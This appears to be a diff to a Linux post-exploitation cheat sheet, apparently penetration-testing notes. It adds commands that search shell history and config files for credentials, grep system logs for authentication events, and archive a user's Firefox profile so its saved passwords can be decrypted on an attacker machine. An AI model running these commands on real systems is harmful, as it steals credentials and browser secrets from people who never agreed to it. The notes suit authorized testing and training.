@@ -335,10 +335,32 @@ su newroot
 
 ```
 cat ~/.*history | less
+cat .bash_history
 ```
 
-* Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line.
-* Note that there is no space between the -p option and the password!
+* Look for `sshpass`, `mysql -p`, `su`, `ssh` commands with credentials passed inline.
+
+#### Find Config Files and Logs with Passwords
+
+```bash
+for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+
+Search logs for authentication events and password changes:
+
+```bash
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+```
+
+#### Firefox Saved Passwords
+
+If the target user has Firefox installed, tar up the `.mozilla` directory and bring it back to your attack machine:
+
+```bash
+tar czf /tmp/mozilla.tar.gz -C /home/user .mozilla
+# Transfer to attacker, then:
+python3 firefox_decrypt.py mozilla/firefox/
+```
 
 #### Config Files
 
